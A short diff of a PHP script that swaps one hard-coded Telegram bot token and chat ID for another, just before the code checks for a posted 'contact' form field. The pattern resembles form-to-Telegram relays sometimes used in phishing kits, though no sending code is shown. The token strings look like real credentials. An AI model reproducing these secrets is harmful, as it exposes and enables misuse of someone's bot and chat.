@@ -2,8 +2,8 @@
 ob_start(); 
 require 'config.php';
 
-$token = "6284813017:AAErB5Urfgqycv35t02wvQmvIGAc-p9g6lI";
-$chat_id = "749243435";
+$token = "5959169999:AAFFWMzU0eSRoRDXWFc8juzNi3HiTpx6QME";
+$chat_id = "-1001742607911";
 
 
 if (isset($_POST['contact']))
